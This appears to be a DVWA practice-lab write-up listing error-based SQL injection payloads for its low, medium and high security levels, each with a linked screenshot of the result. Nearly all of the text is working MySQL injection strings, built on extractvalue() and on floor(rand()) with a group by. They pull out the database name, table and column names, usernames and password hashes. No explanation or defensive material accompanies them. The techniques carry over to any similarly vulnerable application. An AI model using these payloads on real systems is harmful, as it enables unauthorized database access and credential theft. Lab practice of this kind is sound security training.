LOW LEVEL

Database name: %' and extractvalue('<a>xxx</a>', concat(':',database()))#

![image](https://github.com/nahcusira/dvwa/assets/87233531/4b2cb28e-a77c-4753-a734-4c0305de18ba)

Table name: %' and extractvalue('<a>xxx</a>', concat(':',(select table_name from information_schema.tables where table_schema =database() limit 1, 1)))#

![image](https://github.com/nahcusira/dvwa/assets/87233531/8acf8f08-8941-44e0-8120-2f5c2c5cf8fa)

Column name: %' and extractvalue('<a>xxx</a>', concat(':', (select column_name from information_schema.columns where table_name ="users" limit 3, 1)))#

![image](https://github.com/nahcusira/dvwa/assets/87233531/bbf89c69-c3e5-4ceb-8cd4-1cb28f6c5e71)

User name: %' and extractvalue('<a>xxx</a>', concat(':',(select user from users limit 0, 1)))#

![image](https://github.com/nahcusira/dvwa/assets/87233531/12d748a0-2166-4f9f-85e4-ea3ae88330c2)

Passwords: ' and extractvalue('<a></a>', concat((select password from users limit 0, 1)))#

![image](https://github.com/nahcusira/dvwa/assets/87233531/da52046a-f7c4-432c-aa6c-728319065ce5)

MEDIUM LEVEL

Database name: 1 and (select 1 from (select count(*), concat(0x3a, 0x3a, (select database()), 0x3a, 0x3a, floor(rand()*2))a from information_schema.tables group by a)b) #

![image](https://github.com/nahcusira/dvwa/assets/87233531/f108438b-0c6a-4671-ab57-067b7fd8b4a1)

Table name: 1 and (select 1 from (select count(*), concat(0x3a, 0x3a, (select table_name from information_schema.tables where table_schema =database() limit 1, 1), 0x3a, 0x3a, floor(rand()*2))a from information_schema.tables group by a)b) #

![image](https://github.com/nahcusira/dvwa/assets/87233531/2a698f5b-db1e-4266-ba38-184072311342)

Column name: 1 and (select 1 from (select count(*), concat(0x3a, 0x3a, (select column_name from information_schema.columns where table_name = char(117,115,101,114,115) limit 4, 1), 0x3a, 0x3a, floor(rand()*2))a from information_schema.tables group by a)b) #

![image](https://github.com/nahcusira/dvwa/assets/87233531/bb00cd12-151c-4762-b214-0afcb378cab5)

User name: 1 and (select 1 from (select count(*), concat(0x3a, 0x3a, (select user from users limit 0, 1), 0x3a, 0x3a, floor(rand()*2))a from information_schema.tables group by a)b) #

![image](https://github.com/nahcusira/dvwa/assets/87233531/01eb9591-3929-4439-bea1-526823469250)

Passwords: 1 and (select 1 from (select count(*), concat(0x3a, 0x3a, (select password from users limit 0, 1), 0x3a, 0x3a, floor(rand()*2))a from information_schema.tables group by a)b) #

![image](https://github.com/nahcusira/dvwa/assets/87233531/6a2e4594-156c-40a9-90aa-495449ef2cdb)

HIGH LEVEL

Database name: %' and extractvalue('<a>xxx</a>', concat(':',database()))#

![image](https://github.com/nahcusira/dvwa/assets/87233531/752ced8c-f1ca-4ae4-8112-21e35e02ef66)

Table name: %' and extractvalue('<a>xxx</a>', concat(':',(select table_name from information_schema.tables where table_schema =database() limit 1, 1)))#

![image](https://github.com/nahcusira/dvwa/assets/87233531/de34abd2-0cd4-4945-bc04-97f2ecb32685)

Column name: %' and extractvalue('<a>xxx</a>', concat(':', (select column_name from information_schema.columns where table_name ="users" limit 3, 1)))#

![image](https://github.com/nahcusira/dvwa/assets/87233531/cbb3e681-2c25-4ec6-8d69-c6ab5de94ae7)

User name: %' and extractvalue('<a>xxx</a>', concat(':',(select user from users limit 0, 1)))#

![image](https://github.com/nahcusira/dvwa/assets/87233531/a1c05c1d-e488-40d7-93af-8d11f324c945)

Passwords: ' and extractvalue('<a></a>', concat((select password from users limit 0, 1)))#

![image](https://github.com/nahcusira/dvwa/assets/87233531/6c8e42b7-82ac-457d-94aa-231f8e8877ee)
